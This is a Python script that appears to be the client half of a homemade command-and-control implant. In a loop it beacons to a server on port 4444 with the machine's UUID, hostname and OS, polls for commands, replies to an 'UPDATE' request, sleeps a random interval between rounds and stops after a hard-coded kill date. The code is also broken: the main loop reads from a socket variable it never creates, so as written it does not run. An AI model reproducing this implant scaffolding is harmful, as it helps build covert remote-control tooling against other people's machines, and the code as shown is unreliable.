#!/usr/bin/env python3

import os.path
import socket
from datetime import datetime
import time
import random
import uuid
from platform import node

SERVER_IP = "localhost"
SERVER_PORT = 4444
BUFFER_SIZE = 2048
DEATH_DATE = datetime(2020,1,20)
OS = os.popen("lsb_release -d | cut -d ':' -f2").read().strip()
UUID = uuid.uuid1()
HOSTNAME = node().strip()

def connectToServer(ip, port):
    print("Connecting to server")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

def sendData(socket, data):
    print("Sending Data")
    socket.sendall(data.encode())

def closeSocket(socket):
    print("Closing Socket")
    socket.close()

def beacon(ip, port):
 #   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #   s.connect((ip, port))
    fields = "UUID: " + str(UUID) + "\r\n"
    fields += "HOSTNAME: " + HOSTNAME + "\r\n"
    fields += "OS: " + OS + "\r\n"
    http_get("client/" + str(UUID) + "/commands",fields)

def http_get(uri, params):
    data = "GET /" + uri + " HTTP/1.1\r\n"
    data += params
    print(data)
   # try:
    s = connectToServer(SERVER_IP, SERVER_PORT)
    sendData(s, str(data))
   # except:
   #     print("GET FAILED")
   #     return False

if __name__ == "__main__":
    print("Starting client")
    while datetime.now() < DEATH_DATE:## Need to change this to consecutive missed phone homes
#        s = connectToServer(SERVER_IP, SERVER_PORT)
#        sendData(s, "PING")
        beacon(SERVER_IP, SERVER_PORT)
        print("Recieving data")
        data = s.recv(BUFFER_SIZE).decode()
        if data:
            print(data)
            if data == "UPDATE":
                info = "UPDATE RESPONSE\r\n"
                info += str(UUID) + "\r\n"
                info += OS + "\r\n"
                info += HOSTNAME + "\r\n"
                sendData(s, info)
        closeSocket(s)
        time.sleep(random.randint(1,10))
